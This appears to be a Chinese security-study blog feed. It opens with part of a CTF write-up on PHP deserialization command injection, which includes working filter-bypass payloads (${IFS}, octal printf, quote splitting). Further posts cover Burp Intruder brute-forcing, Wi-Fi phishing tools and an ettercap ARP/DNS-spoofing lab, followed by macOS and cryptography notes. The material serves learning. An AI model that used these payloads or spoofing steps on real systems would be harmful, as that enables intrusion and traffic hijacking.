class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br>  <br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>  &#125;<br> <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ping&quot;</span>))) &#123;<br>      <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>  &#125; <br> <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;don&#x27;t hack&quot;</span>;<br>    &#125;<br>  &#125;<br> <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<br>    &#125;<br>  &#125;  <br>&#125;<br><br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意项为：传入的args需要为array数组</p><p>首先尝试执行未被过滤的命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pwd&quot;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJwd2QiO319</span><br></code></pre></td></tr></table></figure><p>采用post方法传参，可以看到成功执行pwd命令。</p><p>那么接下来就是替换成其他的命令，且要绕过正则过滤。</p><p>该题的构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;more$&#123;IFS&#125;fl&quot;&quot;ag_1s_here$(printf$&#123;IFS&#125;&quot;\57&quot;)f\lag_831b69012c67b35f.p\hp&#x27;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>稍微记录下一些绕过：</p><p>(命令行知识：$()这个符号，可以把括号里面的东西当命令执行,反引号同理。)</p><ul><li><p>反斜线\绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ l\s<br></code></pre></td></tr></table></figure></li><li><p>${IFS},$IFS代替空格</p></li><li><p>拼接法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ a=fl;b=ag;<span class="hljs-built_in">cat</span>$IFS$a<span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure></li><li><p>引号绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">//如<span class="hljs-built_in">cat</span>、<span class="hljs-built_in">ls</span>被过滤<br>$ ca<span class="hljs-string">&quot;&quot;</span>t /flag<br>$ l<span class="hljs-string">&#x27;s&#x27;</span> /<br></code></pre></td></tr></table></figure></li><li><p>八进制编码和十六进制编码绕过</p><p>比如：“&#x2F;“的八进制编码为\57，那么使用$(printf${IFS}”\57”)<strong>内敛执行输出</strong>“&#x2F;”到字符串中。</p><p>所以该题在应对flag被正则过滤时也可以：（\141是a的八进制编码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;more$&#123;IFS&#125;fl$(printf$&#123;IFS&#125;&quot;\141&quot;)g_1s_here$(printf$&#123;IFS&#125;&quot;\57&quot;)f\lag_831b69012c67b35f.p\hp&#x27;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure></li><li><p>cat的替换命令</p><table><thead><tr><th>tac</th><th>与cat相反，按行反向输出</th></tr></thead><tbody><tr><td>more</td><td>按页显示，用于文件内容较多且不能滚动屏幕时查看文件</td></tr><tr><td>less</td><td>与more类似</td></tr><tr><td>tail</td><td>查看文件末几行</td></tr><tr><td>head</td><td>查看文件首几行</td></tr></tbody></table></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>php反序列化：</p><p><a href="https://zhuanlan.zhihu.com/p/601673949">https://zhuanlan.zhihu.com/p/601673949</a></p><p><a href="https://blog.csdn.net/Hardworking666/article/details/122373938">https://blog.csdn.net/Hardworking666/article/details/122373938</a></p><p><a href="https://www.cnblogs.com/hugboy/p/web_php_unserialize.html">https://www.cnblogs.com/hugboy/p/web_php_unserialize.html</a></p><p>rce绕过:</p><p><a href="https://blog.csdn.net/m0_73185293/article/details/131557169">https://blog.csdn.net/m0_73185293/article/details/131557169</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf-web</category>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>机器学习</title>
    <link href="/2023/09/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/09/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="wrong password." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="633dde11d44536a9c8ce48afd5e3088426b16b95859edcdb8f03e9f3893a1e20"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>burpsuite学习</title>
    <link href="/2023/09/09/burpsuite%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/09/09/burpsuite%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h1><h2 id="Intruder模块"><a href="#Intruder模块" class="headerlink" title="Intruder模块"></a>Intruder模块</h2><h3 id="模式介绍"><a href="#模式介绍" class="headerlink" title="模式介绍"></a>模式介绍</h3><p>Intruder共有4种模式，如下图：</p><p><img src="https://s2.loli.net/2023/09/10/J8FYCvIRSrzEGc7.png" alt="image-20230811154651214"></p><ol><li>Sniper:一个一个的替换；（单个list）</li><li>battering ram：一对一对的替换；（单个list）</li><li>pitchfork：<strong>一一对应</strong>；（<strong>多个list</strong>）</li><li>cluster bomb：尝试到每个排列组合；（<strong>多个list</strong>）</li></ol><p>以crapi中的challenge3为例，在intruder中设置两个变量</p><p><img src="https://s2.loli.net/2023/09/10/fu2JhWnRKU9vAdw.png" alt="image-20230811163011823"></p><ul><li><h4 id="Sniper"><a href="#Sniper" class="headerlink" title="Sniper:"></a><strong>Sniper</strong>:</h4><p>选择”payload type”:Simple list；创建一个简单的payload list</p><img src="https://s2.loli.net/2023/09/10/axLUJ5FTe9PqzAR.png" alt="image-20230811163348523" style="zoom:60%;" /><p>暂且称第一个变量为1，第二个为2，则替换过程为：先将1用 <strong>list</strong> 中的值逐次替换，2不变；再将2逐次替换，1不变</p><img src="https://s2.loli.net/2023/09/10/1wvP4L35YixpCgD.png" alt="image-20230811163526674" style="zoom:50%;" /><p>RequestCount&#x3D; payloadCount*变量个数</p></li><li><h4 id="Battering-ram"><a href="#Battering-ram" class="headerlink" title="Battering ram:"></a><strong>Battering ram:</strong></h4><p>将所有变量同时用 <strong>list</strong> 中的一个值替换</p><img src="https://s2.loli.net/2023/09/10/45mg3MYHk7xNyec.png" alt="image-20230811164142769" style="zoom: 65%;" /><p>RequestCount&#x3D; payloadCount</p></li><li><h4 id="pitchfork"><a href="#pitchfork" class="headerlink" title="pitchfork:"></a><strong>pitchfork:</strong></h4><p>由于有两个变量，所以需要分别将两个变量的list（payload set）设置好，最上方的数字表示的是set，为1则表示当时在设置第一个set，为2则表示在设置第二个set</p><img src="https://s2.loli.net/2023/09/10/4TZ8R7UiFLtjnO2.png" alt="image-20230811164936140" style="zoom:67%;" /><img src="https://s2.loli.net/2023/09/10/YoTOLp4MSuAUjRr.png" alt="image-20230811165016766" style="zoom:67%;" /><p>由上可以看到，本人将两个set分别设置为小写和大写的26个字母。</p><p>而启动attack则可以看到，每个元素是<strong>一一对应</strong>的</p><p><img src="https://s2.loli.net/2023/09/10/1zcwWti7DJGHX2E.png" alt="image-20230811165126891"></p><p>RequestCount&#x3D; payloadCount（单个set&#x2F;list）</p></li><li><h4 id="Cluster-bomb"><a href="#Cluster-bomb" class="headerlink" title="Cluster bomb:"></a><strong>Cluster bomb:</strong></h4><p>类似于上一个，但是会尝试到每一个组合</p><p><img src="https://s2.loli.net/2023/09/10/57kiSCZfuIsjEp8.png" alt="image-20230811165343094"></p><p>RequestCount&#x3D; payloadCountOf_1*payloadCountOf_2(……)</p></li></ul><h2 id="定长数字爆破"><a href="#定长数字爆破" class="headerlink" title="定长数字爆破"></a>定长数字爆破</h2><p>首先将type设置成Numbers</p><img src="https://s2.loli.net/2023/09/10/sCUngh7l8pouZGV.png" alt="image-20230811165750670" style="zoom:70%;" /><p>比如这里的需求是需要实现0001到9999的爆破，那么就要如下图来设置，保证生成的数字如0001 为“0001”而不是“1“</p><img src="https://s2.loli.net/2023/09/10/lNTP4btSQvzBVi8.png" alt="image-20230811165944026" style="zoom:67%;" /><h2 id="相关参考链接"><a href="#相关参考链接" class="headerlink" title="相关参考链接"></a>相关参考链接</h2><p><a href="https://blog.csdn.net/zbj18314469395/article/details/115429675">https://blog.csdn.net/zbj18314469395/article/details/115429675</a></p><p><a href="https://www.cnblogs.com/tysec/p/15781784.html">https://www.cnblogs.com/tysec/p/15781784.html</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wireless_security</title>
    <link href="/2023/09/09/wireless-security/"/>
    <url>/2023/09/09/wireless-security/</url>
    
    <content type="html"><![CDATA[<h1 id="无线安全"><a href="#无线安全" class="headerlink" title="无线安全"></a>无线安全</h1><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>基础知识和一些攻击:</p><p><a href="https://www.scucyber.cn/wireless_sec/">https://www.scucyber.cn/wireless_sec/</a></p><p><a href="https://juejin.cn/post/6844903572836974599">伪AP检测技术研究 - 掘金 (juejin.cn)</a></p><p><a href="https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/">https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/</a></p><p>一些工具：</p><ul><li><p>wifiPhisher–设立一个钓鱼AP</p><p><a href="https://zhuanlan.zhihu.com/p/149945656">wifiphisher实现无线渗透WiFi钓鱼 - 知乎 (zhihu.com)</a></p></li><li><p>airocrack-ng–实施一些ap攻击</p></li><li><p><a href="https://blog.csdn.net/qq_19623861/article/details/117690103">(134条消息) 使用kali破解WIFI——Aircrack-ng_kali aircrack-ng_我重来不说话的博客-CSDN博客</a></p></li><li><p>airSnarf</p></li><li><p>airbase-ng</p></li><li><p>mdk3,mdk4</p></li><li><p>hostapd</p></li><li><p>fluxion–设立一个钓鱼AP</p><p><a href="https://www.cnblogs.com/cmt110/p/15125418.html">Wifi钓鱼工具——fluxion - freeliver - 博客园 (cnblogs.com)</a></p></li></ul><h3 id="kali设定成桥接模式"><a href="#kali设定成桥接模式" class="headerlink" title="kali设定成桥接模式"></a>kali设定成桥接模式</h3><p><a href="https://blog.csdn.net/qq_43633973/article/details/100732758">(134条消息) 【虚拟机】解决Kali虚拟机不能联网问题（桥接模式WIFI和本地网线）_江湖one Cat的博客-CSDN博客</a></p><h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><p>AP：无线接入点</p><p>STA站点：每一个连接到无线网络中的终端</p><p>SSID：服务集标识符，一个或一组基础架构模式无线网络的标识</p><ul><li>基本服务集标识符（BSSID），表示的是AP的MAC地址</li><li>扩展服务集定标识符（ESSID），一个最长32字节区分大小写的字符串，表示无线网络的名称</li></ul><p>（bssid就是具体的某个连锁店编号（001）或地址，ssid就是连锁店的名字或者照片，essid就是连锁店的总公司或者招牌or品牌。一般ssid和essid都是相同的）</p><p><a href="https://blog.csdn.net/Winds_Up/article/details/118296162">(134条消息) 无线网安全威胁：伪AP攻击原理与检测方法综述【转载】_Winds_Up的博客-CSDN博客</a></p><h2 id="2-4G-5G标准"><a href="#2-4G-5G标准" class="headerlink" title="2.4G&#x2F;5G标准"></a>2.4G&#x2F;5G标准</h2><p>2.4G频段共划分为14个信道（能用的仅13个），5G频段共划分为5个信道</p><h2 id="扫描无线网络"><a href="#扫描无线网络" class="headerlink" title="扫描无线网络"></a>扫描无线网络</h2><ul><li>主动扫描：客户端主动发送<strong>探测请求（Probe Request）帧</strong>（使用NULL或设置的SSID名称），周围的AP收到该请求后，将会响应该探索信号帧，即使不发送信号的AP也会响应该请求</li><li>被动扫描：AP每隔一段时间自动发送<strong>信号（Beacon）帧</strong>，STA通过侦听AP定期发送的Beacon帧来发现网络</li></ul><h3 id="Airodump-ng使用"><a href="#Airodump-ng使用" class="headerlink" title="Airodump-ng使用"></a>Airodump-ng使用</h3><ul><li>BSSID: AP的Mac地址</li><li>PWR：<strong>信号强度</strong>，数字越小，信号越强</li><li>CH：路由器的所在<strong>频道</strong></li><li>MB：无线所支持的最大速率</li><li>ENC：使用的加密算法体系</li><li>CIPHER：检测到的加密算法</li><li>AUTH：使用的认证协议</li><li>ESSID：路由器的名称</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dns欺骗--kali实现</title>
    <link href="/2023/09/09/dns%E6%AC%BA%E9%AA%97-kali%E5%AE%9E%E7%8E%B0/"/>
    <url>/2023/09/09/dns%E6%AC%BA%E9%AA%97-kali%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS-欺骗"><a href="#DNS-欺骗" class="headerlink" title="DNS 欺骗"></a>DNS 欺骗</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>环境：</p><p>攻击实施：kali linux on vmware </p><p>靶机：windows 7 on vmware </p><span id="more"></span><p>工具:</p><ul><li>arpspoof</li><li>ettercap</li></ul><p>相关原理：</p><p>在一个局域网内，攻击者首先使用ARP欺骗，使目标主机的所有网络流量都通过攻击者的主机。之<br>后攻击者通过嗅探目标主机发出的DNS请求分组，分析数据分组的ID和端口号后，向目标主机发<br>送攻击者构造好的DNS 返回分组，目标主机收到 DNS 应答后，发现ID和端口号全部正确，即<br>把返回的数据分组中的域名和对应的IP地址保存进DNS缓存，而后到达的真实DNS应答分组则被<br>丢弃。</p><h2 id="攻击实施–使用ettercap"><a href="#攻击实施–使用ettercap" class="headerlink" title="攻击实施–使用ettercap"></a>攻击实施–使用ettercap</h2><h3 id="1-基本用法（ARP欺骗）"><a href="#1-基本用法（ARP欺骗）" class="headerlink" title="1.基本用法（ARP欺骗）"></a>1.基本用法（ARP欺骗）</h3><p><strong>修改etter.dns</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim /etc/ettercap/etter.dns<br></code></pre></td></tr></table></figure><ul><li>若写 *则匹配所有（未试验，应该是适用正则） </li><li>A：所有域名指向192.168.83.157（kali的IP）</li></ul><p>具体操作：参照以下链接可以实行ARP欺骗</p><p><a href="https://blog.csdn.net/qq_60503432/article/details/128353116">(134条消息) Kali Linux渗透测试小实践——DNS欺骗_kali dns欺骗_PICACHU+++的博客-CSDN博客</a></p><h3 id="2-DNS劫持"><a href="#2-DNS劫持" class="headerlink" title="2.DNS劫持"></a>2.DNS劫持</h3><p>基于以上的arp欺骗，可以进而实施dns欺骗</p><h4 id="开启端口转发"><a href="#开启端口转发" class="headerlink" title="开启端口转发"></a>开启端口转发</h4><p>ip_forward：为0时是断网攻击，为1时开启流量转发。</p><ul><li>以下命令可以获取当前的ip_forward的值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> /proc/sys/net/ipv4/ip_forward<br></code></pre></td></tr></table></figure><ul><li>以下命令将其设置为1</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> 1 &gt;  /proc/sys/net/ipv4/ip_forward <br></code></pre></td></tr></table></figure><h4 id="kali机启动apache服务"><a href="#kali机启动apache服务" class="headerlink" title="kali机启动apache服务"></a>kali机启动apache服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ service apache2 start<br></code></pre></td></tr></table></figure><p>之后访问<strong>http</strong>网页，则会看到apache的页面，说明劫持成功</p><h4 id="更换靶机访问页面的内容"><a href="#更换靶机访问页面的内容" class="headerlink" title="更换靶机访问页面的内容"></a>更换靶机访问页面的内容</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim /var/www/html/index.html<br></code></pre></td></tr></table></figure><p>参考：<br><a href="http://t.csdn.cn/l8GII">http://t.csdn.cn/l8GII</a></p><p><a href="https://blog.csdn.net/Mr_Wanderer/article/details/107985245">(134条消息) Ettercap中间人攻击——DNS劫持、替换网页内容与ARP欺骗_kali替换网页_Mr. Wanderer的博客-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>网络攻防</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>about-macOS</title>
    <link href="/2023/09/01/mac%E4%BD%BF%E7%94%A8-about%E7%A8%8B%E5%BA%8F%E5%91%98/"/>
    <url>/2023/09/01/mac%E4%BD%BF%E7%94%A8-about%E7%A8%8B%E5%BA%8F%E5%91%98/</url>
    
    <content type="html"><![CDATA[<h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><ol><li><p>.app文件</p><p>macOS 应用程序或 .app 文件是一个 bundle 或从操作系统的角度来看相关资源的集合。例如 Safari.app 包不仅包含可执行文件，还包含信息属性列表、图标、插件等资源。</p><p>与 Windows 不同，在 macOS 上应用程序 不仅仅是一个可执行文件。应该视为一个独立的实体，具有必要的框架和库来独立运行。（可以简单地拖放 .app 以在 macOS 上“安装”程序）</p></li><li><p>.pkg文件</p></li><li><p>.dmg文件</p></li></ol><h2 id="部分功能"><a href="#部分功能" class="headerlink" title="部分功能"></a>部分功能</h2><p>要在Mac上获得剪切粘贴功能，首先，使用常规的Command + C复制文件&#x2F;文件夹 ， 但是在粘贴时，使用 Command + Option + V 而不是 Command +V。 </p><h2 id="使用homebrew"><a href="#使用homebrew" class="headerlink" title="使用homebrew"></a>使用homebrew</h2><ol><li>包管理软件；</li><li>四个部分组成：brew、homebrew-core 、homebrew-cask、homebrew-bottles</li><li>brew：Homebrew 源码仓库</li><li>homebrew-core：Homebrew 核心源</li><li>homebrew-cask：提供macOS应用和大型二进制文件的安装</li><li>homebrew-bottles：预编译二进制软件包</li></ol><table><thead><tr><th>brew –version 或者 brew -v</th><th>显示 brew 版本信息</th></tr></thead><tbody><tr><td>brew install &lt;软件名&gt;</td><td>安装指定软件</td></tr><tr><td>brew uninstall &lt;软件名&gt;</td><td>卸载指定软件</td></tr><tr><td>brew list</td><td>显示所有的已安装的软件</td></tr><tr><td>brew search &lt;软件名&gt;</td><td>搜索本地远程仓库的软件，已安装会显示绿色的勾</td></tr><tr><td>brew search &#x2F;&lt;软件名&gt;&#x2F;</td><td>使用正则表达式搜软件</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ brew install &lt;package&gt;<br><br>$ brew install --cask &lt;package&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cryptography</title>
    <link href="/2023/06/19/cryptography/"/>
    <url>/2023/06/19/cryptography/</url>
    
    <content type="html"><![CDATA[<p>关于密码学课程中，一些知识点和算法的总结</p><span id="more"></span><h2 id="分组密码的操作模式"><a href="#分组密码的操作模式" class="headerlink" title="分组密码的操作模式"></a>分组密码的操作模式</h2><table><thead><tr><th>模式</th><th>问题</th><th></th></tr></thead><tbody><tr><td>ECB</td><td>无法纠正同步差错，有对齐错误，导致整个无法解密</td><td></td></tr><tr><td>CBC</td><td>出错将影响当前分组和下一分组，<strong>有限传播</strong>；误码扩散、自同步、带宽浪费</td><td>带宽浪费在CFB中解决</td></tr><tr><td>CFB</td><td>误码扩散、自同步</td><td>处理单元小于分组；在CBC的基础上引入了移位寄存器；xx（IV或者上一）加密后再与明文异或</td></tr><tr><td>OFB</td><td>无误码扩散、易被篡改</td><td>块内部反馈：反复加密IV再拿去异或；可加密任意长度的数据，不需要进行分组填充</td></tr></tbody></table><h2 id="密码算法的总结"><a href="#密码算法的总结" class="headerlink" title="密码算法的总结"></a>密码算法的总结</h2><table><thead><tr><th>算法</th><th>类型</th><th>分组长度</th><th>密钥长度</th><th></th></tr></thead><tbody><tr><td>DES</td><td>对称</td><td>64</td><td>64（56+8）</td><td>feistel结构</td></tr><tr><td>AES</td><td>对称</td><td>128位</td><td>128（192，256）</td><td>10轮（12，14），square结构，加解密不对称</td></tr><tr><td>IDEA</td><td>对称</td><td>64位</td><td>128</td><td>非feistel</td></tr><tr><td>SM4</td><td>对称</td><td>128位</td><td>128</td><td>非对称的feistel</td></tr><tr><td>RC6</td><td>对称</td><td></td><td></td><td></td></tr><tr><td>RC5</td><td>对称</td><td></td><td></td><td>非feistel</td></tr><tr><td>SM2</td><td>公钥</td><td></td><td></td><td></td></tr><tr><td>RSA</td><td>公钥</td><td>小于密钥长度</td><td>1024bits以上</td><td></td></tr><tr><td>SM3</td><td>散列</td><td></td><td></td><td></td></tr><tr><td>SHA-1</td><td>散列</td><td>512位（64bytes）</td><td>输出长度：160bit；（总共）</td><td>对每个分组4次循环（80步），每个分组的输出（160）</td></tr><tr><td>SHA-256</td><td>散列</td><td>512位（64bytes）</td><td>输出长度：256bit</td><td></td></tr><tr><td>MD5</td><td>散列</td><td>512位（64bytes）</td><td>输出长度：128bit（16bytes）</td><td></td></tr><tr><td>DSA</td><td>签名</td><td></td><td></td><td>elgamal的变体，使用的散列是SHA-1</td></tr><tr><td>RC4</td><td>序列</td><td></td><td></td><td>安全性不高</td></tr></tbody></table><p><strong>ECC</strong>（椭圆曲线）：</p><p>公钥密码；</p><p>密钥短（运算量减少）；</p><h2 id="一些攻击"><a href="#一些攻击" class="headerlink" title="一些攻击"></a>一些攻击</h2><p><strong>唯密文攻击–已知明文攻击–选择明文攻击–选择密文攻击</strong></p><ul><li><p>hill密码：已知明文攻击、选：择明文攻击；</p></li><li><p>对DES的已知明文攻击：因为互补性，密钥空间减小为2^55</p></li><li><p>对DES的选择明文攻击</p></li><li><p>二重DES：中间相遇攻击 ：设两次加密中间值x，由m-(ek1‘)&gt;x‘,c-(dk2’)&gt;x’‘，x’&#x3D;x’‘，再选择一个（M1，C1）检验k1’和k2‘；</p></li><li><p>对RSA的选择密文攻击：并不是攻击算法，而是对协议进行攻击</p></li><li><p>对RSA的小加密指数e攻击</p></li><li><p>elgamal使用相同的随机数加密时：c2&#x2F;c2’&#x3D;m1&#x2F;m2,当m1已知，m2很容易计算出来。</p></li><li><p>对散列函数的生日攻击：与输出的长度有关；</p></li><li><p>对DH密钥协商算法的中间人攻击（及堵塞攻击）：</p><p>解决方案（STS）：签名+数字证书附带一起发送；B在发送回信息的时候会发送C（B）和sigB（sa，sb），攻击者无法伪造签名，因为有数字证书；</p></li><li><p>在身份鉴别中：</p><p>1.pap+散列：无法抵御字典、重放攻击；</p><p>2.PAP+salt机制：抵御了字典，无法抵御重放</p><p>3.质询&#x2F;响应：抵御字典、重放；无法抵御中间人</p></li><li><p>s&#x2F;key：小数攻击</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
